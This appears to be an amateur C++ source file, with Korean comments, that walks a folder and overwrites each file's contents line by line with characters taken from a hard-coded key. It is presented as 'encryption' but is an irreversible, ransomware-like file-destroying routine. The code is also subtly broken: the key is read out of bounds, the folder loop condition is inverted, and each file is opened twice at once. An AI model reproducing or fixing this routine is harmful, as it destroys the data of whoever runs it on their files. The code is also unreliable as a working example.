#include <iostream>
#include <fstream>
#include <io.h>
#include <string>

#define KEY "Sex"

using namespace std;

string Encryption_str(string Original_text)
{
	 for (int i = 0; i < Original_text.size(); i++)
		{
		 Original_text[i]= KEY[i];
		}
	
	return Original_text;
}

void Encryption_File(string path)
{
	fstream Read(path);
	fstream Overwrite(path);	
	string s; // 파일에서 읽어올 문자열을 저장
    if (Read.is_open())
	{
		while (Read)
		{
			getline(Read, s); // 한줄씩 읽는다
		    Overwrite << Encryption_str(s); // 파일을 수정
			s.clear(); // 이중 수정 방지
		}
		Overwrite.close();
		Read.close();
    }
}

void Encryption_Folder(string path)
{



	struct _finddata_t fd;

	intptr_t handle;

	if ((handle = _findfirst(path.c_str(), &fd)) == -1L)
	do
	{
		Encryption_File(fd.name);
	

	} while (_findnext(handle, &fd) == 0);

	_findclose(handle);

}